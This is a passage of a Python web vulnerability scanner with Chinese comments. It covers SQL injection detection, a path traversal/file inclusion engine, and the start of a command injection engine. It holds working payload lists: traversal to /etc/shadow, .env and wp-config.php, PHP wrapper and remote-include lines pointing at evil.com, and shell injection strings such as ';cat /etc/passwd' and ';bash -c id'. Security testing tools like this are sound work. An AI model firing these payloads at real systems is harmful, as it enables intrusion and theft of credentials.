            logger.debug(f"[{self.name}] 数据库类型未知，使用全部 Payload")
            db_type = "All"

        payloads = self._get_payloads_for_db(db_type, param, kwargs.get('max_payloads', self.max_payloads))

        if kwargs.get('enable_obfuscation', self.enable_obfuscation):
            payloads = self.obfuscate_payloads(payloads, level=1)

        # 优化3: 快失败 —— 先用少量探针判断该参数是否值得全量 payload 检测。
        # 安全约束：探针必须覆盖 error-based + boolean-based + time-based 三类特征，
        # 任一命中（响应差异 / SQL 报错 / 明显延时）都继续全量检测，避免漏掉盲注。
        if getattr(settings, 'sqli_fast_fail', True) and len(payloads) > 5:
            probes = list(payloads[:2])
            for _p, _d in payloads:
                _up = str(_p).upper()
                if any(k in _up for k in ('SLEEP(', 'PG_SLEEP(', 'WAITFOR DELAY', 'DBMS_LOCK.SLEEP')):
                    if (_p, _d) not in probes:
                        probes.append((_p, _d))
                    break
            for _p, _d in payloads:
                if '1=1' in str(_p) or '1=2' in str(_p) or 'AND 1' in str(_p).upper():
                    if (_p, _d) not in probes:
                        probes.append((_p, _d))
                    break

            _any_signal = False
            for _probe_payload, _probe_desc in probes:
                _is_time_probe = any(
                    k in str(_probe_payload).upper()
                    for k in ('SLEEP', 'PG_SLEEP', 'WAITFOR', 'DBMS_LOCK')
                )
                try:
                    _probe_url = build_attack_url(url, param, _probe_payload, parsed_query)
                    _probe_start = time.time()
                    _probe_resp = await async_get(
                        _probe_url,
                        session=session,
                        timeout=20 if _is_time_probe else 10,
                        no_retry=True,
                    )
                    _probe_elapsed = time.time() - _probe_start
                    if not (isinstance(_probe_resp, tuple) and len(_probe_resp) >= 2):
                        continue
                    _p_status, _p_text = _probe_resp[0], _probe_resp[1] or ""
                    # 不稳定响应不作为信号，也不作为否定依据
                    if _p_status in (0, 429) or _p_status >= 500:
                        # 例外：含 SQL 报错特征（error-based 注入常以 500 返回 DB 错误）
                        # 应视为命中信号；否则报错注入在探针阶段就被快失败，永远漏检。
                        if self._has_sql_error(_p_text):
                            _any_signal = True
                            break
                        continue
                    if self._has_sql_error(_p_text):
                        _any_signal = True
                        break
                    if _is_time_probe and _probe_elapsed >= 4.0:
                        _any_signal = True  # 疑似时间盲注，继续全量检测
                        break
                    # 短响应差异天然被压缩（如 "1 row: id=1" vs "2 rows returned"
                    # diff≈0.13），用更低阈值避免漏判布尔/报错注入的快失败信号
                    # （否则快失败误判“无差异”直接 return None，全量检测永不执行 → SQLi 漏检）。
                    _fast_thr = 0.1 if (len(_normal_text) < 50 or len(_p_text) < 50) else 0.15
                    _has_diff, _diff = self.has_response_diff(
                        normal_resp,
                        (_p_status, self.strip_payload_reflection(_p_text, _probe_payload), {}),
                        threshold=_fast_thr,
                    )
                    if _has_diff:
                        _any_signal = True
                        break
                except Exception:
                    continue

            if not _any_signal:
                self.log_debug(
                    f"参数 {param} 快失败：{len(probes)} 个探针（含布尔/时间盲注）"
                    f"均无差异，跳过 SQLi 全量检测（{len(payloads)} payloads）"
                )
                return None

        compliant = kwargs.get('compliant', False)

        for payload, desc in payloads:
            if compliant:
                await asyncio.sleep(1.0 / max(1, settings.rps))

            is_time_based = any(kw in payload.upper() for kw in ['SLEEP', 'PG_SLEEP', 'WAITFOR', 'DBMS_LOCK'])
            timeout = 20 if is_time_based else settings.timeout

            attack_url = build_attack_url(url, param, payload, parsed_query)

            try:
                start_time = time.time()
                # N2 修复：注入 payload 触发的 5xx 是报错注入的**判定信号**（error-based
                # 注入本就以 500 + DB 错误页呈现），不是服务端瞬时故障。此前 no_retry
                # 仅对时间型 payload 生效，非时间型走默认重试 → 每个报错 payload 被重试
                # 3 轮（实测单请求 2.8s，放大约 1000 倍），SQLi 全量检测累计耗时 113s，
                # 逼近编排层 asyncio.wait_for(timeout=120) 预算，真实目标上必然超时被杀
                # → 静默 return None（SQLi 生产链路漏报根因）。注入请求一律不重试。
                resp = await async_get(attack_url, session=session, timeout=timeout, no_retry=True)
                elapsed = time.time() - start_time

                if isinstance(resp, tuple) and len(resp) >= 2:
                    attack_status, attack_text = resp[0], resp[1] if resp[1] else ""
                else:
                    attack_status = 0
                    attack_text = ""

                # 准确率修复：服务器错误/限流/连接失败（5xx/429/0）与 payload 无关，
                # 差异来自错误页 → 跳过该 payload（不稳定目标会随机返回 502）。
                # 例外：响应已含 SQL 报错特征（error-based 注入常以 500 返回 DB 错误），
                # 不能当作不稳定跳过，必须落到下方报错注入判定（否则报错注入永远漏检）。
                if attack_status in (0, 429) or attack_status >= 500:
                    if self._has_sql_error(attack_text):
                        pass  # 含 SQL 报错特征 → 继续走下方报错注入判定
                    else:
                        self.log_debug(f"攻击响应不稳定 (状态码 {attack_status})，跳过 payload: {payload[:30]}")
                        continue

                if attack_status in (403, 406) and len(attack_text) < 100:
                    self.log_debug(f"检测到 WAF 阻断 (状态码 {attack_status})，尝试绕过...")
                    bypass_result = await self.try_waf_bypass(
                        url, param, payload, parsed_query, session,
                        "unknown", normal_resp
                    )
                    if bypass_result:
                        return bypass_result
                    continue

                waf_type = await self.detect_waf(attack_text)
                if waf_type:
                    self.log_debug(f"检测到 WAF ({waf_type})，尝试绕过...")
                    bypass_result = await self.try_waf_bypass(
                        url, param, payload, parsed_query, session,
                        waf_type, normal_resp
                    )
                    if bypass_result:
                        return bypass_result
                    continue

                matched_phrases = self._matched_sql_error_phrases(attack_text)
                if matched_phrases:
                    # 基线对比（与 UNION 路径对齐）：报错短语若已存在于正常响应
                    # （静态页面提及 SQL/数据库等）或来自被回显的 payload 本身，
                    # 不算注入触发 → 跳过，避免把靶场首页等静态内容误判成报错注入。
                    _norm_lower = (_normal_text or '').lower()
                    _payload_lower = payload.lower()
                    new_phrases = [
                        p for p in matched_phrases
                        if p not in _norm_lower and p not in _payload_lower
                    ]
                    if new_phrases:
                        evidence = self._extract_sql_error(attack_text)
                        return {
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'type': f'SQL注入-报错注入({desc})',
                            'severity': 'High',
                            'ai_verdict': '高',
                            'confidence': 'high',
                            'evidence': f'SQL错误特征(新出现): {evidence}',
                            'diff_ratio': 0.5,
                            'elapsed': elapsed,
                            'db_type': db_type,
                            'method': 'error_based',
                            'sql_error_phrases': new_phrases
                        }
                    self.log_debug(
                        f"参数 {param} 响应含 SQL 报错关键词但基线已存在，"
                        f"判定为静态噪声，跳过报错注入"
                    )
                    continue

                if is_time_based and elapsed > 4.0:
                    reverse_payload = self._generate_reverse_payload(payload)
                    if reverse_payload and reverse_payload != payload:
                        is_real_time_based, diff = await self._verify_time_based(
                            url, param, payload, reverse_payload, parsed_query, session
                        )
                        if is_real_time_based:
                            return {
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'type': f'SQL注入-时间盲注({desc})',
                                'severity': 'High',
                                'ai_verdict': '高',
                                'confidence': 'high',
                                'evidence': f'确认延迟 {diff:.1f}s (对比请求正常)',
                                'diff_ratio': 0.5,
                                'time_based': True,
                                'elapsed': elapsed,
                                'db_type': db_type,
                                'method': 'time_based'
                            }
                    elif elapsed > 8.0:
                        # ⑧ 三层漏斗：单次大延时未过第二层（A/B逆命题延时复核），
                        #     不满足第三层"AND返回空或超时"的可复现确认 → 疑似不进报告
                        self.log_debug(
                            f"参数 {param} 单次响应延迟 {elapsed:.1f}s 但无 A/B 延时复核，"
                            f"按⑧策略跳过疑似时间盲注"
                        )
                        continue

                has_diff, diff_ratio = self.has_response_diff(
                    normal_resp,
                    (attack_status, self.strip_payload_reflection(attack_text, payload), {}),
                    threshold=0.15
                )

                if has_diff:
                    reverse_payload = self._generate_reverse_payload(payload)
                    if reverse_payload and reverse_payload != payload:
                        ab_result = await self.ab_verify(
                            url, param, payload, reverse_payload,
                            parsed_query, session, normal_resp
                        )
                        if ab_result.get('verified', False):
                            # ⑧ 第二层补充：A/B逆命题通过后，重放攻击请求做稳定性复核，
                            #    防止一次性抖动通过A/B（SPA/CDN随机差异）
                            try:
                                rresp = await async_get(attack_url, session=session, timeout=timeout, no_retry=True)
                            except BaseException:
                                rresp = None
                            if isinstance(rresp, tuple) and len(rresp) >= 2:
                                r_status, r_text = rresp[0], rresp[1] or ""
                                if r_status in (0, 429) or r_status >= 500:
                                    self.log_debug(
                                        f"参数 {param} 重放响应不稳定 (HTTP {r_status})，按⑧跳过"
                                    )
                                    continue
                                r_has, r_diff = self.has_response_diff(
                                    normal_resp,
                                    (r_status, self.strip_payload_reflection(r_text, payload), {}),
                                    threshold=0.15
                                )
                                if not r_has or r_diff < 0.15:
                                    self.log_debug(
                                        f"参数 {param} A/B通过但重放差异消失 ({r_diff:.1%})，"
                                        f"判定为响应抖动，按⑧跳过"
                                    )
                                    continue
                            # ⑥ 反射证据验证：注入唯一12位token，剥离基线后确认反射，
                            #    有反射才可报 High；无反射一律降级（抗SPA噪声/参数化误报）
                            reflected, reflect_evidence = await self.reflective_validator.validate_reflection(
                                url, param, payload, parsed_query, session,
                                baseline_resp=normal_resp
                            )
                            if reflected:
                                return {
                                    'url': url,
                                    'parameter': param,
                                    'payload': payload,
                                    'type': f'SQL注入-布尔盲注({desc})',
                                    'severity': 'High' if diff_ratio > 0.3 else 'Medium',
                                    'ai_verdict': '高' if diff_ratio > 0.3 else '中',
                                    'confidence': 'high' if diff_ratio > 0.3 else 'medium',
                                    'evidence': f'响应差异 {diff_ratio:.1%}, A/B验证通过, {reflect_evidence}',
                                    'diff_ratio': diff_ratio,
                                    'elapsed': elapsed,
                                    'db_type': db_type,
                                    'method': 'boolean_based',
                                    'ab_verified': True,
                                    'reflection_verified': True
                                }
                            self.log_debug(
                                f"参数 {param} A/B 差异稳定但无 token 反射，"
                                f"疑似 SPA/参数化噪声，布尔盲注降级为疑似"
                            )
                            return {
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'type': f'SQL注入-布尔盲注疑似({desc})',
                                'severity': 'Medium',
                                'ai_verdict': '中',
                                'confidence': 'low',
                                'evidence': f'响应差异 {diff_ratio:.1%}, A/B验证通过但无唯一token反射',
                                'diff_ratio': diff_ratio,
                                'elapsed': elapsed,
                                'db_type': db_type,
                                'method': 'boolean_based_suspect',
                                'ab_verified': True,
                                'reflection_verified': False
                            }
                    elif diff_ratio > 0.3:
                        # 准确率修复：无法构造逆命题做 A/B 验证时的双重噪声对照
                        # 1) 良性对照：无害但不同的参数值若也产生相近差异
                        #    （参数回显/错误页/参数化行为），判定为噪声 → 跳过
                        benign_probe = '1zq7benign'
                        benign_url = build_attack_url(url, param, benign_probe, parsed_query)
                        benign_diff = 0.0
                        try:
                            bresp = await async_get(
                                benign_url, session=session,
                                timeout=settings.timeout, no_retry=True
                            )
                            if isinstance(bresp, tuple) and len(bresp) >= 2:
                                _, benign_diff = self.has_response_diff(
                                    normal_resp,
                                    (bresp[0], self.strip_payload_reflection(bresp[1] or "", benign_probe), {}),
                                    threshold=0.15
                                )
                        except BaseException:
                            benign_diff = 0.0
                        if benign_diff >= diff_ratio * 0.6:
                            self.log_debug(
                                f"参数 {param} 对良性值也有 {benign_diff:.1%} 差异，"
                                f"判定为参数化噪声，跳过疑似布尔盲注"
                            )
                            continue
                        # 2) 稳定性复查：重放同一攻击请求，若差异消失
                        #    （响应内容易变/单次抖动），判定为不稳定 → 跳过
                        try:
                            rresp = await async_get(attack_url, session=session, timeout=timeout, no_retry=True)
                        except BaseException:
                            rresp = None
                        if isinstance(rresp, tuple) and len(rresp) >= 2:
                            r_has, r_diff = self.has_response_diff(
                                normal_resp,
                                (rresp[0], self.strip_payload_reflection(rresp[1] or "", payload), {}),
                                threshold=0.15
                            )
                            if not r_has or r_diff < 0.15:
                                self.log_debug(
                                    f"参数 {param} 重放后差异消失 ({r_diff:.1%})，"
                                    f"判定为响应抖动，跳过疑似布尔盲注"
                                )
                                continue
                        # ⑧ 参数级三层漏斗：疑似层（仅响应差异，无A/B逆命题行为确认）不进报告
                        # ① 布尔/时间探针 → suspect
                        # ② A/B逆命题 + 稳定性复核 → probable
                        # ③ 真实注入确认（OR正常/AND空或超时/UNION回显/报错/反射token 五选二）→ confirmed
                        # 仅第三层进报告：疑似层一律跳过，杜绝假404与抖动噪声
                        self.log_debug(
                            f"参数 {param} 响应差异 {diff_ratio:.1%} 但未过三层漏斗第二层"
                            f"（无A/B逆命题+稳定性复核），按⑧策略跳过疑似布尔盲注"
                        )
                        continue

                if 'UNION' in payload.upper() and attack_status == 200:
                    # 准确率修复：
                    # 1. 去掉泛化词 'version'（httpbin 主页的 /version 端点链接曾触发误报）；
                    # 2. 基线对比：数据库关键词若在正常响应中已存在，不算注入回显；
                    # 3. 回显排除：关键词若来自被回显的 payload 本身，不算。
                    _db_kws = ['mysql', 'mariadb', 'postgresql', 'oracle', 'sqlite', 'mssql']
                    _attack_lower = attack_text.lower()
                    _normal_lower = (_normal_text or '').lower()
                    _payload_lower = payload.lower()
                    _db_hit = any(
                        kw in _attack_lower
                        and kw not in _normal_lower
                        and kw not in _payload_lower
                        for kw in _db_kws
                    )
                    if _db_hit:
                        return {
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'type': f'SQL注入-联合查询({desc})',
                            'severity': 'High',
                            'ai_verdict': '高',
                            'confidence': 'high',
                            'evidence': f'响应中包含数据库信息: {attack_text[:200]}',
                            'diff_ratio': 0.5,
                            'elapsed': elapsed,
                            'db_type': db_type,
                            'method': 'union_based'
                        }
            except asyncio.TimeoutError:
                if is_time_based:
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'SQL注入-时间盲注({desc})',
                        'severity': 'High',
                        'ai_verdict': '高',
                        'confidence': 'high',
                        'evidence': f'请求超时 ({timeout}s)，可能触发 SLEEP',
                        'diff_ratio': 0.5,
                        'time_based': True,
                        'timeout': True,
                        'db_type': db_type,
                        'method': 'time_based'
                    }
                self.log_debug(f"请求超时: {attack_url}")
            except Exception as e:
                self.log_debug(f"检测异常: {e}")
        return None


# ============================================================
# LFIEngine
# ============================================================
class LFIEngine(BaseEngine):
    """文件包含/路径遍历检测引擎"""
    name = "lfi"
    description = "文件包含/路径遍历检测引擎"

    priority_params = [
        "file", "page", "path", "dir", "view", "include",
        "template", "load", "read", "cat", "doc", "document",
        "folder", "root", "base", "config", "conf"
    ]

    _base_payloads = [
        ("../../../../etc/passwd", "Linux passwd"),
        ("../../../../etc/hosts", "Linux hosts"),
        ("../../../../etc/shadow", "Linux shadow"),
        ("../../../../etc/group", "Linux group"),
        ("../../../../etc/fstab", "Linux fstab"),
        ("../../../../etc/crontab", "Linux crontab"),
        ("../../../../etc/hostname", "Linux hostname"),
        ("../../../../etc/issue", "Linux issue"),
        ("../../../../proc/self/environ", "Linux environ"),
        ("../../../../proc/self/cmdline", "Linux cmdline"),
        ("../../../../proc/version", "Linux version"),
        ("../../../../var/log/apache/access.log", "Apache日志"),
        ("../../../../var/log/nginx/access.log", "Nginx日志"),
        ("../../../../var/log/auth.log", "认证日志"),
        ("../../../../var/log/syslog", "系统日志"),
        ("../../../../var/log/messages", "系统消息日志"),
        ("../../../../var/log/mysql/error.log", "MySQL错误日志"),
        ("..\\..\\..\\windows\\win.ini", "Windows win.ini"),
        ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "Windows hosts"),
        ("..\\..\\..\\boot.ini", "Windows boot.ini"),
        ("..\\..\\..\\windows\\system.ini", "Windows system.ini"),
        ("..\\..\\..\\windows\\php.ini", "Windows php.ini"),
        ("..\\..\\..\\windows\\my.ini", "Windows my.ini"),
        ("../../../../.env", ".env环境变量"),
        ("../../../../.env.local", ".env.local"),
        ("../../../../.env.production", ".env.production"),
        ("../../../../.env.development", ".env.development"),
        ("../../../../wp-config.php", "WordPress配置"),
        ("../../../../app/config/parameters.yml", "Symfony配置"),
        ("../../../../application/config/config.php", "CodeIgniter配置"),
        ("../../../../config/database.php", "数据库配置"),
        ("../../../../config/config.php", "通用配置"),
        ("../../../../includes/config.php", "包含配置"),
        ("../../../../settings.php", "Drupal配置"),
        ("../../../../sites/default/settings.php", "Drupal配置"),
        ("../../../../web.config", "web.config"),
        ("../../../../.htaccess", ".htaccess"),
        ("../../../../.htpasswd", ".htpasswd"),
        ("../../../../composer.json", "Composer配置"),
        ("../../../../package.json", "package.json"),
        ("../../../../.git/config", "Git配置"),
        ("../../../../.git/HEAD", "Git HEAD"),
        ("../../../../.svn/entries", "SVN"),
        ("....//....//....//etc/passwd", "双写路径"),
        ("..%2f..%2f..%2f..%2fetc/passwd", "URL编码"),
        ("..%5c..%5c..%5c..%5cwindows%5cwin.ini", "URL编码Windows"),
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd", "双重编码"),
        ("%252e%252e%252f%252e%252e%252fetc/passwd", "三重编码"),
        ("..%252f..%252f..%252fetc/passwd", "嵌套编码"),
        ("..%c0%af..%c0%af..%c0%afetc/passwd", "UTF-8绕过"),
        ("../../../../etc/passwd%00", "空字节绕过"),
        ("../../../../etc/passwd%00.jpg", "空字节+扩展名"),
        ("../../../../etc/passwd.", "尾部点"),
        ("../../../../etc/passwd/", "尾部斜杠"),
        ("../../../../etc/passwd?test=1", "查询参数"),
        ("../../../../etc/passwd#test", "锚点"),
        ("php://filter/convert.base64-encode/resource=../../../../etc/passwd", "PHP Filter(encode)"),
        ("php://filter/read=convert.base64-encode/resource=../../../../etc/passwd", "PHP Filter(read)"),
        ("php://input", "PHP Input"),
        ("expect://id", "PHP Expect"),
        ("data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8%2B", "PHP Data"),
        ("http://127.0.0.1/evil.txt", "RFI-本地"),
        ("https://evil.com/shell.txt", "RFI-远程"),
        ("//evil.com/evil.txt", "RFI-协议相对"),
        ("../../../../proc/self/status", "进程状态"),
        ("../../../../proc/self/fd/", "文件描述符"),
    ]

    FILE_INCLUDE_INDICATORS = [
        'root:x:0:0:', 'daemon:x:1:1:', 'bin:x:2:2:',
        'sys:x:3:3:', 'nobody:x:65534:', 'www-data:x:',
        'mysql:x:', 'postgres:x:', '[boot loader]',
        '[operating systems]', '[extensions]', '<?php',
        '<?xml', 'DB_PASSWORD', 'DB_USER', 'APP_KEY',
        'SECRET_KEY', 'DATABASE_URL', 'REDIS_URL',
        'JWT_SECRET', 'API_KEY', '# Apache', '# nginx',
        'HKEY_LOCAL_MACHINE', 'Windows Registry',
        '[Unit]', '[Service]', '[Install]', '127.0.0.1',
        'localhost', '::1', '# /etc/', '#!/bin/',
    ]

    # 准确率修复：
    # 1. 去掉 r'<pre>'（过于泛化，任何含代码示例的页面都会命中，httpbin 主页即误报）；
    # 2. 去掉未转义的 [DIR]/[TXT]/[SND]（正则字符类，匹配任何含字母 D/T/S 的页面）。
    DIRECTORY_LISTING_PATTERNS = [
        r'Index of /', r'Parent Directory',
        r'<title>Index of', r'\[DIR\]', r'\[TXT\]', r'\[SND\]',
        r'Directory Listing', r'<a href="[^"]+/">',
    ]

    def __init__(self):
        super().__init__()
        import platform
        self._is_windows = platform.system() == "Windows"
        self._payloads_ordered = False
        self._ordered_payloads = None

    def get_payloads(self, param: str = None, max_count: int = None) -> List[Tuple[str, str]]:
        if not self._payloads_ordered:
            if self._is_windows:
                windows_payloads = []
                linux_payloads = []
                for p, d in self._base_payloads:
                    if 'win.ini' in p or 'boot.ini' in p or 'windows' in p.lower() or '\\' in p:
                        windows_payloads.append((p, d))
                    else:
                        linux_payloads.append((p, d))
                self._ordered_payloads = windows_payloads + linux_payloads
            else:
                self._ordered_payloads = self._base_payloads.copy()
            self._payloads_ordered = True

        payloads = self._ordered_payloads

        if max_count is None:
            max_count = self.max_payloads

        cache_key = f"{param or 'default'}_{max_count}"
        if cache_key in self._payload_cache:
            return self._payload_cache[cache_key]

        if param and param.lower() in self.priority_params:
            result = payloads[:max_count]
        else:
            half = max(3, len(payloads) // 2)
            result = payloads[:min(half, max_count)]
            if param and self.priority_params:
                for p, desc in payloads:
                    if any(kw in desc.lower() for kw in self.priority_params):
                        if (p, desc) not in result:
                            result.append((p, desc))

        if len(self._payload_cache) >= self._cache_max_size:
            oldest_key = next(iter(self._payload_cache))
            del self._payload_cache[oldest_key]
        self._payload_cache[cache_key] = result
        return result

    async def check(
        self,
        url: str,
        param: str,
        normal_resp: Tuple[int, str, Dict],
        parsed_query: str,
        session,
        **kwargs
    ) -> Optional[Dict]:
        if normal_resp is None or not isinstance(normal_resp, tuple) or len(normal_resp) < 2:
            try:
                resp = await async_get(url, session=session, timeout=5, no_retry=True)
                if isinstance(resp, tuple) and len(resp) >= 2:
                    normal_resp = (resp[0], resp[1] if resp[1] else "", resp[2] if len(resp) > 2 else {})
                else:
                    return None
            except BaseException:
                return None

        if isinstance(normal_resp, tuple):
            _normal_status, normal_text = normal_resp[0], normal_resp[1]
        else:
            _normal_status, normal_text = normal_resp.status, await normal_resp.text()

        compliant = kwargs.get('compliant', False)
        is_static = kwargs.get('is_static', False)

        if not await self._is_file_param(url, param, parsed_query, session):
            self.log_debug(f"参数 {param} 不像文件参数，跳过 LFI 检测")
            return None

        payloads = self.get_payloads(param, max_count=kwargs.get('max_payloads', self.max_payloads))
        if is_static:
            payloads = payloads[:8]

        for payload, desc in payloads:
            if compliant:
                await asyncio.sleep(0.3)

            attack_url = build_attack_url(url, param, payload, parsed_query)

            try:
                attack_resp = await async_get(attack_url, session=session, timeout=settings.timeout, no_retry=True)

                if isinstance(attack_resp, tuple):
                    attack_status, attack_text = attack_resp[0], attack_resp[1]
                else:
                    attack_status, attack_text = attack_resp.status, await attack_resp.text()

                # 准确率修复：服务器错误/限流/连接失败与 payload 无关，跳过
                if attack_status in (0, 429) or attack_status >= 500:
                    self.log_debug(f"攻击响应不稳定 (状态码 {attack_status})，跳过 payload: {payload[:30]}")
                    continue

                if attack_status in (403, 406) and len(attack_text) < 100:
                    self.log_debug(f"检测到 WAF 阻断 (状态码 {attack_status})，尝试绕过...")
                    bypass_result = await self.try_waf_bypass(
                        url, param, payload, parsed_query, session,
                        "unknown", normal_resp
                    )
                    if bypass_result:
                        return bypass_result
                    continue

                waf_type = await self.detect_waf(attack_text)
                if waf_type:
                    self.log_debug(f"检测到 WAF ({waf_type})，尝试绕过...")
                    bypass_result = await self.try_waf_bypass(
                        url, param, payload, parsed_query, session,
                        waf_type, normal_resp
                    )
                    if bypass_result:
                        return bypass_result
                    continue

                if self._is_file_included(attack_text):
                    evidence = self._extract_file_evidence(attack_text, payload)
                    verified = self._is_strong_system_evidence(attack_text)
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'文件包含-LFI({desc})',
                        'severity': 'Critical' if verified else 'High',
                        'ai_verdict': '极高' if verified else '高',
                        'confidence': 'high',
                        'evidence': evidence,
                        'diff_ratio': 0.5,
                        'file_read': True,
                        'lfi_verified': verified,
                    }

                if self._is_error_disclosure(attack_text):
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'路径遍历-报错泄露({desc})',
                        'severity': 'Medium',
                        'ai_verdict': '中',
                        'confidence': 'medium',
                        'evidence': f"检测到错误信息泄露（非文件内容回显）: {attack_text[:120]}",
                        'diff_ratio': 0.5,
                    }

                if self._is_base64_content(attack_text):
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'文件包含-LFI(Base64编码)({desc})',
                        'severity': 'High',
                        'ai_verdict': '高',
                        'confidence': 'high',
                        'evidence': f"检测到 Base64 编码内容: {attack_text[:100]}...",
                        'diff_ratio': 0.5,
                        'file_read': True,
                        'base64_encoded': True
                    }

                # 准确率修复：目录列表特征必须是"注入后新出现"的，
                # 正常响应中已存在（如首页自带 <pre>/链接列表）则不算
                if self._has_directory_listing(attack_text) and not self._has_directory_listing(normal_text):
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': '路径遍历-目录列表',
                        'severity': 'High',
                        'ai_verdict': '高',
                        'confidence': 'high',
                        'evidence': self._extract_dir_listing(attack_text),
                        'diff_ratio': 0.5,
                        'dir_listing': True
                    }

                has_diff, diff_ratio = self.has_response_diff(
                    normal_resp,
                    (attack_status, self.strip_payload_reflection(attack_text, payload), {}),
                    threshold=0.3
                )
                if has_diff and len(attack_text) > len(normal_text) * 1.2:
                    return {
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': f'文件包含-疑似({desc})',
                        'severity': 'Medium',
                        'ai_verdict': '中',
                        'confidence': 'medium',
                        'evidence': f"响应长度异常变化 {diff_ratio:.1%}",
                        'diff_ratio': diff_ratio,
                        'suspected': True
                    }

            except Exception as e:
                self.log_debug(f"LFI 检测异常 {param}: {e}")

        return None

    async def _is_file_param(
        self,
        url: str,
        param: str,
        parsed_query: str,
        session
    ) -> bool:
        file_indicators = ['file', 'path', 'page', 'view', 'include', 'template', 'load', 'read', 'cat', 'dir', 'doc']
        if any(ind in param.lower() for ind in file_indicators):
            return True

        try:
            test_payload = "test.txt"
            test_url = build_attack_url(url, param, test_payload, parsed_query)
            resp = await async_get(test_url, session=session, timeout=5, no_retry=True)

            if isinstance(resp, tuple):
                text = resp[1]
                status = resp[0]
            else:
                text = await resp.text()
                status = resp.status

            if status in (404, 403) or "not found" in text.lower():
                return True
        except BaseException:
            logger.debug("suppressed exception (engine audit)")

        return True

    def _is_file_included(self, text: str) -> bool:
        for indicator in self.FILE_INCLUDE_INDICATORS:
            if indicator in text:
                return True
        return False

    def _is_strong_system_evidence(self, text: str) -> bool:
        """A6 读取证明：响应含强系统文件特征（只有真实读到系统文件才会出现），
        才认定实锤（lfi_verified），避免把普通字符串回显误判为高危。
        """
        STRONG = [
            'root:x:0:0:', 'daemon:x:1:1:', 'bin:x:2:2:', 'nobody:x:65534:',
            'mysql:x:', 'postgres:x:', '[boot loader]', '[operating systems]',
            '[extensions]', 'HKEY_LOCAL_MACHINE', '[Unit]', '[Service]', '[Install]',
        ]
        return any(s in text for s in STRONG)

    def _is_error_disclosure(self, text: str) -> bool:
        """A6 报错泄露降级：响应是框架/语言错误信息（而非文件内容）时，
        只能证明路径遍历存在，不能证明读到文件内容，降级 Medium。
        """
        ERROR_PATTERNS = [
            'failed to open stream', 'no such file or directory',
            'open_basedir', 'warning:', 'fatal error:', 'traceback',
            'filenotfounderror', 'permission denied', 'include(',
            'java.io.filenotfoundexception', 'system.io.filenotfoundexception',
        ]
        low = text.lower()
        return any(p in low for p in ERROR_PATTERNS)

    def _is_base64_content(self, text: str) -> bool:
        base64_pattern = r'^[A-Za-z0-9+/=]+$'
        lines = text.split('\n')
        base64_lines = 0
        for line in lines:
            line = line.strip()
            if len(line) > 20 and re.match(base64_pattern, line):
                base64_lines += 1
                if base64_lines > 3:
                    return True
        return False

    def _has_directory_listing(self, text: str) -> bool:
        for pattern in self.DIRECTORY_LISTING_PATTERNS:
            if re.search(pattern, text, re.I):
                return True
        return False

    def _extract_file_evidence(self, text: str, payload: str) -> str:
        for indicator in self.FILE_INCLUDE_INDICATORS:
            if indicator in text:
                lines = text.split('\n')
                for line in lines:
                    if indicator in line:
                        return line[:200]
        return text[:200]

    def _extract_dir_listing(self, text: str) -> str:
        links = re.findall(r'<a href="([^"]+)"', text)
        if links:
            return f"发现 {len(links)} 个目录项: {', '.join(links[:10])}"
        files = re.findall(r'([a-zA-Z0-9._-]+)\s+\d{4}-\d{2}-\d{2}', text)
        if files:
            return f"发现 {len(files)} 个文件: {', '.join(files[:10])}"
        return "目录列表已开启"


# ============================================================
# CMDIEngine
# ============================================================
class CMDIEngine(BaseEngine):
    """命令注入检测引擎"""
    name = "cmdi"
    description = "命令注入检测引擎"

    priority_params = [
        "cmd", "exec", "command", "run", "ping", "traceroute",
        "dig", "nslookup", "host", "shell", "bash", "sh",
        "system", "passthru", "popen", "proc_open",
        "exec", "system", "shell_exec", "passthru"
    ]

    payloads = [
        (";id", "分号注入-id"),
        ("|id", "管道注入-id"),
        ("`id`", "反引号注入-id"),
        ("$(id)", "命令替换-id"),
        (";whoami", "whoami"),
        ("|whoami", "whoami管道"),
        (";uname -a", "系统信息"),
        ("|uname -a", "系统信息管道"),
        (";pwd", "当前目录"),
        ("|pwd", "当前目录管道"),
        (";echo test", "echo测试"),
        ("|echo test", "echo管道"),
        (";ls -la", "ls命令"),
        ("|ls -la", "ls管道"),
        (";ps aux", "ps命令"),
        ("|ps aux", "ps管道"),
        (";netstat -an", "netstat命令"),
        ("|netstat -an", "netstat管道"),
        (";ifconfig", "ifconfig命令"),
        ("|ifconfig", "ifconfig管道"),
        (";cat /etc/passwd", "cat passwd"),
        ("|cat /etc/passwd", "cat passwd管道"),
        (";id;", "多分号"),
        ("|id|", "多管道"),
        (";id|", "混合分隔"),
        ("|id;", "混合分隔反向"),
        (";id&&ls", "逻辑与"),
        (";id||ls", "逻辑或"),
        ("&id&ls", "Windows与"),
        ("&&id&&ls", "Windows双与"),
        (";${IFS}id", "IFS变量"),
        (";cat${IFS}/etc/passwd", "IFS+cat"),
        (";cat</etc/passwd", "重定向绕过"),
        (";cat$IFS/etc/passwd", "无空格"),
        (";%69%64", "URL编码"),
        (";$(echo%20id)", "echo+编码"),
        (";`echo%20id`", "反引号+编码"),
        (";id%0a", "换行绕过"),
        (";id%0d", "回车绕过"),
        (";id%09", "Tab绕过"),
        (";a=id;$a", "变量赋值"),
        (";eval id", "eval执行"),
        (";sh -c id", "sh执行"),
        (";bash -c id", "bash执行"),
        (";python -c 'import os;os.system(\"id\")'", "python执行"),
        (";perl -e 'system(\"id\")'", "perl执行"),
        ("&whoami", "Windows&"),
        ("&&whoami", "Windows&&"),
        ("|whoami", "Windows管道"),
        ("||whoami", "Windows或"),
        (";whoami", "Windows分号"),
        ("&ipconfig", "Windows ipconfig"),
        ("&systeminfo", "Windows systeminfo"),
        ("&ver", "Windows ver"),
        (";sleep 5", "sleep测试"),
        ("|sleep 5", "sleep管道"),
